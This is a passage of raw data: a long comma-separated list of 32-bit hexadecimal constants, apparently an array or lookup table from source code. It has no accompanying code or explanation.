0xA0FDCB82, 0xADF8F882, 0xB8278882, 0x43D2FA82, 0xF9998582, 0xA520B982, 0x2DA4C282, 0x6EE4A282, 0x64DF6282, 0x32ED9F82, 0xC9C75E82, 0xD896CD82, 0xBEB14C82, 0x19EAE282, 0xE3247582, 0xF2DB6A82, 0xCDFF3C82, 0x60FF6382, 0x1BAA7182, 0x2B86F382, 0x97852A82, 0x4892B882, 0xEF1BC082, 0x459F2683, 0x59394583, 0xCE70F183, 0x40470683, 0x57F9BC83, 0x7771AB83, 0xA4302183, 0x5E149683, 0x4EC0D983, 0x40CF0783, 0x972CC383, 0xA79BE783, 0x4F85E783, 0x20AB5783, 0x7EF02883, 0x45F2BD83, 0x5E113483, 0x4E9AC983, 0x2ACAB783, 0xD3C08183, 0x38992E83, 0x49DF83, 0x7DA6BC83, 0x40321B83, 0xAF3AFD83, 0x5F978584, 0xB7F70784, 0xA4746384, 0x90F64284, 0x2148EA84, 0xA5DF7484, 0x455F1084, 0x468B0884, 0xFC227584, 0xC70F4A84, 0x47D87A84, 0x61B00A84, 0x6DB46584, 0x3A13D384, 0xA3906284, 0x24877D84, 0x8C938784, 0xBE998184, 0x1A900C84, 0x63A89684, 0x9174AF84, 0x517A4384, 0xC866A984, 0xC5B7E685, 0x62F02485, 0x86AC4A85, 0xC4D88A85, 0xF3B1CA85, 0x8687E285, 0x9D1E7785, 0xC60D0785, 0xCA072485, 0x134E0785, 0xBE515485, 0xF4D99685, 0x68639D85, 0x87431585, 0x60C23785, 0xAA318785, 0xC380AC85, 0xE1BC7485, 0xACDE6985, 0xCB570185, 0x94AAC486, 0x3001EA86, 0xA79BC686, 0xB73A1486, 0x3F88CD86, 0x253286, 0x99FCC86, 0xAFCB2B86, 0x93628786, 0x48F16186, 0xF8D5EB86, 0xDF720C86, 0x802FB686, 0x801D0D86, 0xFA12E286, 0x65CA9286, 0x98A10A86, 0xA4157987, 0x4267DA87, 0x30F8A487, 0xADBBA287, 0x7E946E87, 0x654F0287, 0xF82D5A87, 0x96E7AD87, 0xA0DC0B87, 0x8CD3E487, 0xEB0D3C87, 0xE4AC0387, 0xE0B35187, 0x7E5A1587, 0x497C8787, 0x21322887, 0x40D0EB87, 0xF881AB87, 0xCA95C487, 0x20FD3E87, 0xC85C4487, 0x2530A087, 0x1C576388, 0x56C1E488, 0xA4363188, 0xC2703B88, 0xEB864288, 0xFF5A1988, 0x224A3488, 0x45C8C188, 0x48D72B88, 0x60746B88, 0x1B7BB388, 0xC9458688, 0x40D82D88, 0x483C5C88, 0x34C4E789, 0xC4F63A89, 0x8129EF89, 0x84E4A289, 0xC5E0C989, 0xF8BDA989, 0x109D1F89, 0x1C0CAE89, 0x9208D689, 0x737C3689, 0xE9BA6189, 0xB505BD89, 0xBE7ACD89, 0x41702C8A, 0xD8FF798A, 0xE2C0DD8A, 0x233E058A, 0x9211A28A, 0x1DFE8D8A, 0x1E20138A, 0x577DAA8A, 0x8179C48A, 0xD2858D8A, 0x3E91FC8A, 0x1E63088A, 0x7C18FC8A, 0x3C94D88A, 0x751908A, 0x8880038A, 0x4E2C348B, 0x74EE2D8B, 0x91F6848B, 0x5194658B, 0x776888B, 0xBB75D38B, 0x2B39128B, 0x2EC19A8B, 0xB5CC548B, 0xDCC0B8B, 0x2A3E5E8B, 0x1134F68B, 0xAFA1148B, 0xE7E3C98B, 0x98C9138B, 0x72E2E18B, 0x972C5A8B, 0x2E9D628C, 0xAB12738C, 0xDE7D398C, 0x7D4FD28C, 0xEA2188C, 0x858678C, 0xA25CCB8C, 0x900C878C, 0xC10F178C, 0x323DC78C, 0x51523B8C, 0x170F68C, 0xF987BE8C, 0x79F8C18C, 0x9AA3CC8C, 0xBA84FD8C, 0x6FE5218C, 0x291E938C, 0xA2FC08C, 0xA19A238D, 0xB1BD08D, 0x4C83DE8D, 0x3939B8D, 0xC9C13D8D, 0x1900628D, 0xC4CD928D, 0xDF594D8D, 0x1984F88D, 0x9D2D778D, 0x896CDF8D, 0xC1AEB88D, 0x18C9DE8D, 0x104DDE8D, 0x935C978D, 0xA45B6C8D, 0xFF43C18D, 0xCB65198D, 0xA64C378D, 0x9E3418D, 0x7178558D, 0x84A3918D, 0x782CA58D, 0x8AFC488D, 0x495DBE8D, 0x6A77FE8D, 0xC161558D, 0x8DC0368D, 0x5888F58E, 0x660C468E, 0x8957038E, 0x3F91358E, 0x10089F8E, 0x9B76BB8E, 0xC025338E, 0x8928428E, 0xBF21818E, 0xF000828E, 0x58515E8E, 0x1DCD878E, 0x7A03CC8E, 0xFB45728E, 0x242D88E, 0xD315978E, 0xA3E4798E, 0xCBE7068F, 0x7508668F, 0x2EEDB18F, 0x5ACAA48F, 0x5023F8F, 0xE9A5578F, 0x94AF848F, 0x8A68388F, 0x1E28B28F, 0x9B7BA38F, 0xE9F2B68F, 0xA66AAE8F, 0xAD6C2B8F, 0xF016E08F, 0xB181F88F, 0x33D6868F, 0xFE25A58F, 0xF9ABE88F, 0xF4268190, 0x8174B90, 0xCAB21090, 0xCDC4A590, 0xB0313590, 0x8AFE3D90, 0x771FE190, 0x29828690, 0x5154EC90, 0xA3DAC790, 0xC9DBDA90, 0x3ED21C90, 0xF541B690, 0x5604B890, 0x641F7790, 0xF3768F90, 0x5C85FF90, 0x90847790, 0x37677590, 0xA3F44390, 0x6EF54490, 0x123E5B90, 0x79716890, 0x3E160C90, 0x87B92190, 0xD050F490, 0xD28DBA90, 0x77CBA290, 0x6AC64990, 0x47017C90, 0xBA97CE91, 0xC47F5B91, 0x1552DC91, 0xFE21F891, 0xEE292B91, 0x72344191, 0x7875CE91, 0xBB7E6991, 0xC6609191, 0xF7E1A691, 0x3B0CA391, 0x7BCD8991, 0x74A0F291, 0xC0F1BC91, 0xBF974891, 0x9BE9C691, 0xAD7BB191, 0x9DB5D391, 0x2B521F91, 0xB9632A91, 0xD3600591, 0xA4EA0691, 0x8C913A91, 0xB08B6992, 0xD439C692, 0x7DDADB92, 0x1D9CAB92, 0x531E4892, 0x13D53892, 0x132B6D92, 0x6AE36192, 0x6CE3692, 0xB0AD7792, 0xA3A78392, 0xF9A51B92, 0xEE13F92, 0xC6F36292, 0x3F480F92, 0x822BC992, 0xED84792, 0x899D9092, 0x660A3692, 0x91F72E92, 0xD3F6C892, 0x3E50AE92, 0x3DCF0092, 0x721B2492, 0xA8D2FB92, 0x3000F092, 0x37F5BD93, 0xD35DD93, 0xA6C68693, 0x8B755993, 0xBADA0093, 0xB83CEE93, 0x6E31E993, 0x2C7ADB93, 0xDD616893, 0xCD83C393, 0x17FF9393, 0x6970BA94, 0x21D5A94, 0xBBAEEF94, 0xED35C094, 0xB72CF194, 0xBB1A1294, 0xEA432A94, 0xA1CB6C94, 0x96891C94, 0xC4D91094, 0x53DB6994, 0xA3BD9E94, 0xCB7C8994, 0xA7F84694, 0x45705F94, 0xF3876894, 0x2F171B94, 0x50CDB295, 0x6FCB7795, 0xF5F4BD95, 0x20527695, 0xA5A0C695, 0xE7CB4F95, 0x457AE195, 0x7AD67C95, 0x836D9795, 0xD4C73595, 0xC9780B95, 0xB6209195, 0x45F72495, 0x80340396, 0x5DCD0796, 0x3401FC96, 0x6BF6E296, 0x23E6BA96, 0xA286DE96, 0xB294796, 0x7B48E696, 0x796DE696, 0x4609D596, 0x46B0C696, 0x26FCFB96, 0xC5223796, 0xAE92DD96, 0xF4F3C796, 0x8802F696, 0x76D28E96, 0x5FD797, 0xA100CC97, 0xBEA88097, 0x3ED2B997, 0x95115F97, 0xC869FE97, 0xA4B82097, 0x80EAD297, 0xCF94BA97, 0xC143E97, 0x7F985597, 0x9E1E4798, 0x28924E98, 0xAEB29F98, 0xA9AD3D98, 0x88EAF398, 0x32BF9598, 0x228A2598, 0x2E7D9B98, 0xA6D8B798, 0x72429998, 0x5D382498, 0xE5F16398, 0x17229D98, 0x2B28F598, 0x55634798, 0xA0AF0B98, 0xCAFEE798, 0x9E5D9198, 0xB07DAF98, 0xC6294698, 0x9561AD98, 0xA0134498, 0xF5AB0D98, 0x93D23399, 0x9FA4AF99, 0xD0F51299, 0x47D61C99, 0x9C080899, 0x815CAE99, 0x8D9EDD99, 0x92302899, 0x829A799, 0x36F75399, 0x4D3C9A99, 0x9FCE9C9A, 0x388FDE9A, 0xFBBA699A, 0x46D06B9A, 0xF6422F9A, 0x6A396E9A, 0x249C1B9A, 0x3813019A, 0x4A1DC59A, 0x952ABD9A, 0xB66B0C9A, 0x7B33289A, 0xEAD0269A, 0x4136829A, 0xB4E0E69A, 0xFC3379A, 0x688BE9A, 0x1A75DC9A, 0xC5EB849A, 0x39C1849A, 0xB927CE9A, 0xCEA0F9A, 0x628F489B, 0xBE70849B, 0xB5C5C99B, 0x65376C9B, 0x23BF0F9B, 0x83B69B, 0x59F3479B, 0xBFAA349B, 0x9B29D99B, 0x9CF1C19B, 0x42A08C9B, 0x80E4659B, 0x2916D69B, 0x3E220A9B, 0x8BD5759B, 0xB114489B, 0x1185F9B, 0x961FD9B, 0x2BCAF9B, 0x7F93799B, 0x627A559B, 0x3EFBDD9B, 0x45037B9B, 0x9FEEAA9C, 0x7762249C, 0x7A18BB9C, 0x9D7A609C, 0x159FE39C, 0xF69B729C, 0xE6B90E9C, 0xE254C39C, 0x8F3F3A9C, 0xC0445A9C, 0xE943B09C, 0x3AAB699C, 0xE0EBB49C, 0x54E79E9C, 0x7C40F09C, 0xCB75BD9C, 0xF26E339C, 0x2F9A309C, 0x66C3C59C, 0xB014A09C, 0xAC3CEB9C, 0x1D0C929D, 0xA2C5BD9D, 0x8C2DFA9D, 0x5D240E9D, 0xF803589D, 0xCC78999D, 0x9254249D, 0xAF8F8E9D, 0xC9B6949D, 0xCCE2FE9D, 0x1F88819D, 0x17F1C69D, 0xE5DE7D9D, 0xD89599D, 0xFF92B49D, 0xE21069D, 0xD447439D, 0xCB074B9D, 0xE202879D, 0xBC12F9E, 0x4C2BA99E, 0xF3A6309E, 0xFD95899E, 0xB8D2C99E, 0xD87F3A9E, 0x19CEAC9E, 0x6477EC9E, 0x3543019E, 0x12E62F9E, 0x6E9B8B9E, 0x9D77259E, 0x9AB49E, 0x6158959E, 0xAE0F069E, 0x9458459E, 0xC736999E, 0xD86A029E, 0x4370999E, 0xA8171E9E, 0x452E8D9E, 0x7F87559E, 0x1E05F29F, 0x3974879F, 0x2765919F, 0x3F6B949F, 0x1544B29F, 0x1B03F59F, 0xC678B29F, 0x3ECD839F, 0x68BB439F, 0xA6DAA79F, 0xC901AA9F, 0xDAC84C9F, 0xFC2F119F, 0x84E7DE9F, 0x76A1DB9F, 0x8CB53C9F, 0xC758D19F, 0xF0E1689F, 0x66571CA0, 0x28C57FA0, 0x3FE8C5A0, 0x83C846A0, 0x6A619A0, 0xC6D53AA0, 0x2CF305A0, 0xEAF291A0, 0xB2E1E1A0, 0x59677BA0, 0x515DB2A0, 0xE4903AA0, 0x63BFA7A0, 0x78D7A5A0, 0x27512BA0, 0x7CAC6FA0, 0xE64F97A0, 0x9C84BDA0, 0xFC7464A0, 0x83B608A0, 0xD2B7A5A0, 0x13EFB9A0, 0xA2A0AA0, 0xDBA768A1, 0xC7AE6AA1, 0xA3EFE4A1, 0x2F8013A1, 0x5FED3BA1, 0x91A081A1, 0x6AF994A1, 0x60AA4AA1, 0xFFB2ADA1, 0xCD69BEA1, 0x7D8F26A1, 0x2DE48DA1, 0x30DA1DA1, 0x17469AA1, 0xCBD98BA1, 0xF258ADA1, 0x5AFCD8A1, 0xC44762A1, 0xBD2EA1A1, 0x8CE63FA1, 0x939982A1, 0xED130FA1, 0xE26D39A1, 0xE57202A1, 0x18DD76A1, 0xBCACBEA2, 0xA639DCA2, 0xE3570BA2, 0x4538C4A2, 0x335190A2, 0xE8D56DA2, 0xEC3060A2, 0x3FF247A2, 0xF8C3E4A2, 0x749DEEA2, 0xFB93C5A2, 0xD6460EA2, 0x124BCFA2, 0x7265BEA2, 0x423B7BA2, 0x259C6BA2, 0x5AE7EDA2, 0x59B5C2A2, 0xDFB9A2A2, 0x5FEE98A2, 0xA85397A2, 0xF8E4BDA2, 0xE61110A2, 0x7D3007A2, 0x786CA0A2, 0xDA7951A2, 0x6F9BA2, 0x3225BA3, 0xC8A423A3, 0x4EE74A3, 0xED23C8A3, 0x4926A3, 0xA3407CA3, 0x1192C9A3, 0x959E43A3, 0x3B0BB3A3, 0xAB8319A3, 0xD2EA77A3, 0x8A292AA3, 0x6F7043A3, 0xC0EFB7A3, 0xBB8104A3, 0xA4E4CBA3, 0xC306A9A3, 0xCF428FA4, 0x6961E2A4, 0x28689AA4, 0x9BABCBA4, 0x85BA15A4, 0x31A630A4, 0xB41064A4, 0xEBE420A4, 0x69200FA4, 0x670913A4, 0x38C951A4, 0x23FF2BA4, 0xE10A7CA4, 0xF03895A4, 0x3F1ABDA4, 0x894314A4, 0xAFEC26A4, 0x96100EA4, 0x95D61A4, 0x923C3AA4, 0x891BA8A4, 0xC8ABAA4, 0x6F5913A4, 0x4A4A40A4, 0x7CE2EA4, 0x4FA43BA4, 0xF5CD2AA4, 0x644C9FA4, 0x31FD0BA4, 0x1CF89DA5, 0x744A9EA5, 0x93ADEA5, 0xE224A6A5, 0xE792C4A5, 0xFB138A5, 0xA6D8D7A5, 0xD08CC1A5, 0x2FFD2FA5, 0x65D139A5, 0x63DC4A5, 0x95D07BA5, 0x5435F6A5, 0x6AEFE6A5, 0x46FB06A5, 0x5DE226A5, 0xFD7814A5, 0x25EA2AA5, 0x34AAAFA5, 0x34E735A6, 0xEFAF4BA6, 0x93F985A6, 0x63F093A6, 0xE28D3A6, 0x2544E7A6, 0xC0332A6, 0xC62406A6, 0x670FA2A6, 0x1720ABA6, 0x57506EA6, 0xF3B148A6, 0x2A50D1A6, 0x2F28F0A6, 0x7FDDC0A6, 0x3BD9B0A6, 0x5F8A22A6, 0xE14FDBA6, 0x53576FA7, 0xDF45B2A7, 0xA796D7A7, 0x4CE9BAA7, 0xE778B2A7, 0x3F9C90A7, 0xB0127EA7, 0xC92719A7, 0x8B67DCA7, 0x3B637AA7, 0xB9137BA7, 0x80DB77A7, 0xCF9221A7, 0xF65C20A7, 0xA89F4DA7, 0x8147FEA7, 0xBA39CA7, 0xD6EF9DA7, 0xC1224AA7, 0xA2B88CA7, 0x2569C9A7, 0x2CE311A7, 0xDD5D08A7, 0xFD103BA7, 0xDBB2FA7, 0x80A9E7A7, 0xCE7D50A8, 0x866004A8, 0xAE548FA8, 0xCF614CA8, 0x6EA5F4A8, 0xF2CDD6A8, 0x5B2A67A8, 0x667046A8, 0xB0ABFEA8, 0x23DF19A8, 0x6BE3ACA8, 0x25BE7FA8, 0x149C60A8, 0x7B0040A8, 0x140CA5A8, 0xD21639A8, 0x68BD42A9, 0x476B23A9, 0xC65586A9, 0xEFC01CA9, 0xCFEA19A9, 0xD906A3A9, 0x47DB08A9, 0x5C0AB2A9, 0x94AB35A9, 0x25E2DBA9, 0xE1870EA9, 0x4B3C9CA9, 0x13E7A5A9, 0x49F977A9, 0x5DB7B3A9, 0xC54156A9, 0x5C7D4EA9, 0x29CE8BAA, 0x12760AA, 0x467F4CAA, 0xEFB078AA, 0xD07C8AAA, 0x642DA5AA, 0x1E21F7AA, 0xA6459CAA, 0xB2B2BBAA, 0xB1817BAA, 0x7B93CDAA, 0x1972E8AA, 0xAD3C7EAA, 0xDA65ECAA, 0x66FF4FAA, 0x31C31DAA, 0x5B1B70AA, 0x7D80EEAA, 0x53F5B5AB, 0x55D33EAB, 0x6C5738AB, 0xEEDE7FAB, 0x7D479AAB, 0x27EEBCAB, 0xFD60F5AB, 0xDE3316AB, 0xF01E2AAB, 0xDEAB87AB, 0x99E4EAAB, 0xABF783AB, 0xB2410EAB, 0x6F812CAB, 0x3F1A5DAB, 0x60539BAB, 0x939218AB, 0x8E5D4EAB, 0xAB688DAB, 0x453C7CAB, 0x818534AC, 0xE3DB81AC, 0xBDA90BAC, 0xE123C7AC, 0x66E4A3AC, 0xC46F74AC, 0xB6F7CBAC, 0x5B39D0AC, 0x90E805AC, 0x59DE73AC, 0xC7B4D7AC, 0x2DF5A6AC, 0x1BBB2CAC, 0x5D91D9AC, 0x18DB04AC, 0x1C4946AC, 0xA61FF9AC, 0x1425F6AC, 0x749909AC, 0x361E9EAC, 0xCB7415AC, 0x902E26AC, 0xD7ACC7AD, 0xF0B330AD, 0x63B02FAD, 0xA08B46AD, 0xF528A2AD, 0xFFED9BAD, 0x70F6D3AD, 0xFBD13FAD, 0xF7E2FBAD, 0x37DBC2AD, 0x362E69AD, 0x1E58A7AD, 0xC8B789AD, 0xA557AEAD, 0x64BDAAAD, 0x95050CAD, 0x2701A9AD, 0x95C4B5AD, 0x94C834AD, 0x998E5CAD, 0xDB06F7AD, 0x267FCEAD, 0xA7FA70AE, 0x8F6754AE, 0x127F2DAE, 0x40C323AE, 0xC5F72EAE, 0xDA58D7AE, 0x1E82C2AE, 0xDAF3B0AE, 0x4DD46DAE, 0xE1B38AE, 0x5D6739AE, 0x550665AE, 0x296574AE, 0x2C32D9AE, 0x5BC276AE, 0xBAB4C0AE, 0xD24BC1AE, 0x1F0DD8AF, 0x748D72AF, 0xE8FC85AF, 0x7CCC49AF, 0x4B83FCAF, 0xC4CD35AF, 0x79B067AF, 0xE68E14AF, 0xE243B2AF, 0x2E3759AF, 0xAA2A0EAF, 0xE6EEF8AF, 0x7A8053AF, 0xC74F9AF, 0x65DDE8AF, 0x69DFA0AF, 0xDEBAB2AF, 0xF83E4DAF, 0xD044C8AF, 0x907498B0, 0xF00A20B0, 0xE128F2B0, 0x9CBC4B0, 0xC38E9DB0, 0xAE667CB0, 0xF09157B0, 0x84B35B0, 0xB0523B0, 0x279077B0, 0x98602B0, 0x2A32CB0, 0x1F3CADB0, 0x1FEC16B0, 0xA17F9AB0, 0x1D4211B0, 0xC47AB1B0, 0x194BB7B0, 0xECD73DB0, 0x36EC0EB0, 0x624530B0, 0x53B694B1, 0x1B3803B1, 0x46DB13B1, 0xF477D0B1, 0x4579CAB1, 0x3CEC07B1, 0x116997B1, 0x395D18B1, 0x4D15FDB1, 0x68D486B2, 0x59910AB2, 0x7253D5B2, 0x4E665BB2, 0x52A1CAB2, 0x2849D4B2, 0x21B458B2, 0xBF0F4B2, 0xB5BF87B2, 0x27EF6CB2, 0x110752B2, 0x6EC6B5B2, 0xBF25E7B2, 0x46794EB2, 0x19FCBBB2, 0x24A4E0B2, 0x313434B2, 0x2EC2A0B2, 0x841800B3, 0xEB2D93B3, 0x4D4C37B3, 0x173F2EB3, 0x235A57B3, 0xC62E77B3, 0x72052DB3, 0x2B7B57B3, 0x429AEAB3, 0x75885CB3, 0xD8761BB3, 0x65B92B3, 0xDF5ADB3, 0x184F6AB3, 0x9C6DA0B3, 0x11F38FB3, 0xEF9C8CB3, 0xFC5FF7B3, 0x42BF09B3, 0x44828FB3, 0xC9D098B3, 0x6D55B3B3, 0xE131E3B3, 0x882D3EB3, 0x4CB2AB4, 0xBE3D32B4, 0xF1F9D4B4, 0xBA2BB4B4, 0x159751B4, 0xBE1E7BB4, 0x48CEB6B4, 0x342FA2B4, 0x4EA70FB4, 0x802A21B4, 0x5DED14B4, 0xB5ABC4B4, 0xADEED2B4, 0x4C8F02B4, 0xC3240BB4, 0xC4D71AB4, 0x6255F3B4, 0x5A32D4B4, 0xF58FDEB4, 0xAB3346B5, 0x37DD48B5, 0x16184FB5, 0x3D6360B5, 0x75321B5, 0xE0C28DB5, 0x92268BB5, 0x4CC674B5, 0xD79803B5, 0xDDDE59B5, 0x42098B5, 0x1B760FB5, 0xA1B447B5, 0xCE6B62B5, 0xAE050B5, 0x76AFFBB5, 0xE8F538B5, 0x16FB88B5, 0x13A010B5, 0x2DB9EAB5, 0xD9082BB5, 0xFE027CB5, 0xA85207B5, 0xC40192B5, 0x76A9FEB6, 0x451FB6B6, 0xE797A4B6, 0x16F464B6, 0x13B10B6, 0x499747B6, 0x585E49B6, 0xCBB5F9B6, 0xDF9C38B6, 0x3C3E2AB6, 0x9E35DAB6, 0x2939D0B6, 0x150E03B6, 0xDA13A4B6, 0x52559BB6, 0x3A7E5FB6, 0xBE32B3B6, 0x959818B6, 0xC7A5ACB7, 0x3A3599B7, 0xFDE84CB7, 0x74C2C1B7, 0x8E3222B7, 0x8E7AEEB7, 0xBD64F1B7, 0x86B76CB7, 0xD5774FB7, 0x5B35EEB7, 0x2F98B4B7, 0xD1BAAFB7, 0x3CD9CBB7, 0x654D93B7, 0x3C08ECB7, 0xCE1332B7, 0xEB382B7, 0x18B012B7, 0x195EF5B7, 0xE6DE71B7, 0x1DEC67B7, 0xDE8C0DB8, 0x3EAD9DB8, 0x31711B8, 0xE90005B8, 0x7AB43DB8, 0x208D0CB8, 0x77BB7CB8, 0x2AFB14B8, 0x679DFB8, 0xBD5F0EB8, 0x386CE0B8, 0x9F119B8, 0x2DED2B8, 0x8E319AB8, 0x40E25DB8, 0x11A178B8, 0x854E9AB8, 0x5CC2F1B8, 0xB60CFBB9, 0xA95299B9, 0xF6F9D1B9, 0x25915CB9, 0xD04568B9, 0xC6981FB9, 0x5F072EB9, 0x593143B9, 0x7FADB4B9, 0xA07BAEB9, 0x447A9EB9, 0xECA8ACB9, 0x6844C4B9, 0x8DBBB0B9, 0x1A83A1B9, 0xC1CD89B9, 0xEFD58EB9, 0xB153E1B9, 0xE1FCCDBA, 0x597063BA, 0xC96456BA, 0x7262B5BA, 0x71570DBA, 0x4A947BA, 0xD4A215BA, 0xB60D2BA, 0xE2E8B6BA, 0xD34A6CBA, 0x1891D5BB, 0xA5456DBB, 0x9C95D0BB, 0x86AB8DBB, 0x6FF034BB, 0xF31973BB, 0x3B3907BB, 0x37D152BB, 0x37BE2FBB, 0x311C52BB, 0xFA6373BB, 0x196444BB, 0xC49343BB, 0x39C82BB, 0x8D4D9ABB, 0x6EF43BBB, 0x71B305BB, 0x48171BC, 0x99B58DBC, 0xDDFE9FBC, 0xEA127CBC, 0xCE0AA8BC, 0xB37384BC, 0xD0D8BDBC, 0x8DF9F9BC, 0xDAC523BC, 0x37FBA7BC, 0x413539BC, 0x25A2CABC, 0xC0900BC, 0x16707ABC, 0x3DF493BC, 0x2C2A16BC, 0xC575F0BC, 0x2D7787BC, 0xC9F6F0BC, 0xD374BEBC, 0xE0A619BD, 0x87D1E6BD, 0xBB6321BD, 0x95D5EBD, 0xB241CABD, 0xAA7EA3BD, 0x9BD52ABD, 0x142606BD, 0xD2B8ACBD, 0xA063CABD, 0x239272BD, 0x3F7EDBBD, 0x8FA7CEBD, 0xC39302BD, 0xF8AEB6BD, 0x71077FBD, 0xB58B25BD, 0xD3BF3ABD, 0x629F15BD, 0x1D31CBBD, 0x382C70BE, 0xB96C7ABE, 0xBAF7BFBE, 0x78C4DCBE, 0xAB07CBBE, 0x543CD2BE, 0xAC00A5BE, 0x9BCF1BE, 0x9B0E10BE, 0xDAE2A2BE, 0xED80B5BE, 0x50E0EABE, 0xAB0F06BE, 0x3EFF96BE, 0xE80F8ABE, 0x3E9C4CBE, 0x62D026BE, 0x1D6EABE, 0xA1D7FABE, 0x8F55EBBE, 0xF4D27EBE, 0x290421BE, 0xDD46CEBE, 0x3D981EBF, 0x907A6BF, 0x955B31BF, 0x331AEABF, 0x84DCECBF, 0xE2F262BF, 0xBB8E64BF, 0xA40196BF, 0xE6B033BF, 0x2167CEBF, 0xF3B7EFBF, 0x61CFBCBF, 0x83DE7ABF, 0x13BC46C0, 0x7D876DC0, 0xC560D7C0, 0xDAB4BAC0, 0xE81649C0, 0x13D4ABC0, 0x5CD7C3C0, 0xEC651BC0, 0x9156EFC0, 0xEA5176C0, 0x1EF89DC0, 0x25EC28C0, 0x5F3DDEC0, 0x746DDAC0, 0x376CE3C0, 0x24BC5AC0, 0x42CFE9C0, 0xE27D2FC1, 0x5AEE2FC1, 0xEBC225C1, 0xAF016CC1, 0x2BDE85C1, 0x87F498C1, 0x161780C1, 0xF0211AC1, 0x7ED33DC1, 0x8C7E68C1, 0xDA6A6FC1, 0x38A995C1, 0xC6B6CCC1, 0x2FCF58C1, 0xF0E59BC1, 0x78122DC1, 0xEE38B3C1, 0xE23416C1, 0x129F9DC1, 0x1D87DDC1, 0x33248CC1, 0xE2757AC1, 0x309BBDC1, 0x86DDF9C2, 0x8AD2CC2, 0xAE63B1C2, 0x515292C2, 0xFD8B1AC2, 0x168EE2C2, 0xC54365C2, 0x998103C2, 0x1739DAC2, 0x5EF9C5C2, 0x374827C2, 0xAA2C4AC2, 0xDDD9A8C2, 0x4D1C15C2, 0xC32613C2, 0xD42A41C2, 0x2BA7AC2, 0x64659C2, 0xCAF839C2, 0xE88B4BC2, 0xB9C7FC2, 0xFDF2F7C2, 0x2F9550C2, 0x825423C2, 0x73C100C3, 0xBE6A30C3, 0xAD546CC3, 0xE4ACF8C3, 0xFC0DB4C3, 0x8BF60FC3, 0xA9F7E9C3, 0x2C2A6C3, 0x7A7F5BC3, 0x4999E3C3, 0x5690F6C3, 0x65213FC3, 0x3E69E7C3, 0xC66E28C3, 0x715CB8C4, 0xE2854C4, 0xBB7EC8C4, 0x33C20BC4, 0x2BEFB6C4, 0x99CF02C4, 0xAF7AFCC4, 0x8D2D89C4, 0x2B84D1C4, 0xE8422AC4, 0x4D840FC4, 0x594FEEC4, 0x8FF5D3C4, 0x419DCDC4, 0xC68D47C4, 0xF11414C4, 0x284352C4, 0x4E3A0CC4, 0xCF1384C4, 0xB1080C4, 0x77687DC5, 0x4315A7C5, 0x3E25A3C5, 0x79C916C5, 0x644141C5, 0xB39677C5, 0x2CEDE6C5, 0xE9E7FAC5, 0x2B1BD9C5, 0x7E3BFBC5, 0xBB62AAC5, 0x8DCC19C5, 0xC2E1E2C5, 0x1FFBEFC5, 0xD78358C5, 0x2944A6C5, 0x216CB1C5, 0x8727A4C5, 0x877C0BC5, 0xB44677C5, 0x1CF139C6, 0xCDFBBCC6, 0xA357A2C6, 0x50EF8FC6, 0x900008C6, 0x7B1141C6, 0x5AB552C6, 0x51A16DC6, 0x9620E9C6, 0x929801C6, 0xABBDD5C6, 0x27C1B7C6, 0xC3CB9DC6, 0x4D0449C6, 0x7BFC66C6, 0xC526F3C6, 0x85D813C6, 0x4763B2C6, 0xD830DC7, 0x5EE84DC7, 0x1D09ABC7, 0x7CBC3EC7, 0x89DB0EC7, 0xC3AA2EC7, 0xE13A71C7, 0xBF6993C7, 0xA16626C7, 0x4AC1EFC7, 0xBAE491C7, 0x5E440AC7, 0x7F0580C7, 0x23C88BC7, 0x8E8824C7, 0xF42C43C7, 0x2DFD35C7, 0xFC70EEC7, 0xA1AE7CC7, 0x70559AC7, 0xFD309DC8, 0x97269DC8, 0x210D87C8, 0xFA2402C8, 0x5303FC8, 0xDD2920C8, 0xFEB0C0C8, 0xED7000C8, 0x899933C8, 0xF7784FC8, 0x38BC35C8, 0xA0CE89C8, 0x2A080C8, 0xF46B4DC8, 0x39AA9FC8, 0x1E359CC8, 0x225A38C8, 0xCBC7D3C8, 0x8DEA18C8, 0xDEB491C8, 0xE54DD2C8, 0x297AF6C8, 0x8543AAC8, 0xBEBBFDC8, 0x24005CC8, 0x3B1C07C8, 0x759E0EC9, 0x20AB2FC9, 0x21DBF0C9, 0xC07C64C9, 0x5D3BFFC9, 0x4A23B9C9, 0xBBE6ACC9, 0x2849CAC9, 0xF27483C9, 0x5AC6DAC9, 0xE7AA1BC9, 0x394B7AC9, 0xAC0631C9, 0xC829FAC9, 0xB59D74CA, 0xA78571CA, 0xF33F83CA, 0xBB54ECCA, 0xFDA7B6CA, 0xBD085DCA, 0xB66CF3CA, 0x831D06CA, 0xC53576CA, 0x352633CA, 0x916E37CA, 0xF24777CA, 0x1D6859CA, 0xB54F46CA, 0x42E9F2CA, 0x404794CA, 0x716777CB, 0xD4AE8CB, 0xA812B6CB, 0x1647F1CB, 0xBC7BD5CB, 0x19EE0CCB, 0xB0C576CB, 0x30CB28CB, 0x95A9ACCB, 0x8DAAC3CB, 0x37BC6ACB, 0x287E86CB, 0xC67E3DCB, 0x874BD6CB, 0x3EA7C6CB, 0x4B22C5CB, 0x709B4BCB, 0xBC6C73CB, 0x5F1DDFCB, 0x4AAD0ECB, 0x1D61FACC, 0x808D4CC, 0x5E1020CC, 0xE9529CC, 0x5A3733CC, 0x409411CC, 0xCA160BCC, 0x56135ACC, 0xF125BFCC, 0x286F82CC, 0xB3426BCC, 0x108F36CC, 0x82E548CC, 0x54EA5BCC, 0xC01238CC, 0x1CAAFCC, 0x6346B7CC, 0xE142BBCC, 0x5ED1EECC, 0x8E88B3CC, 0xEBA596CC, 0x6AA6A1CC, 0xA4098ACC, 0xCCDC33CC, 0x2C2618CC, 0xC3C10FCC, 0xD2D026CD, 0x17B0A1CD, 0x6BBDE6CD, 0x1A3EA6CD, 0x11E8B5CD, 0xC60C9ACD, 0x6FD9A7CD, 0xBB77E9CD, 0x9D296BCD, 0x55CF3BCD, 0xA59E3DCD, 0x34E02FCD, 0x1FCF1ECD, 0x314CC6CD, 0xDE8BA3CD, 0x2B0F05CD, 0xA791FCCD, 0xD8C3C1CD, 0x1C996BCD, 0xE41595CE, 0xC846ECCE, 0x2F283CE, 0x72BA00CE, 0x88E4FECE, 0x23D0A1CE, 0xA7EC79CE, 0x74BDA7CE, 0x356E3CE, 0x47ED03CE, 0x10F47CE, 0xE74E85CE, 0x52E054CE, 0x10C151CE, 0x15E141CE, 0x6F8350CE, 0x2AD2C9CE, 0x878486CE, 0xAD99F2CE, 0xF64DF4CF, 0xF478EFCF, 0x335695CF, 0x7BBEA8CF, 0xB5087ACF, 0x209C28CF, 0xE972CACF, 0x469A61CF, 0x9BD00ACF, 0xF1C493CF, 